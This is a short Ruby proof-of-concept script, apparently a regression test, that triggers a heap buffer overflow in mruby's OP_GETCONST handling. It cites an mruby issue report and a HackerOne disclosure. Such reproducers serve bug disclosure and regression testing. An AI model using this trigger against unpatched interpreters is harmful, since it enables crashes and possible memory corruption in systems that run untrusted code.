# Heap buffer overflow in OP_GETCONST
# Issue: https://github.com/mruby/mruby/issues/3693
# Reported via hackerone

def a
  yield
ensure
lambda {a a { return proc{}} }.call
end

lambda { a { return } }.call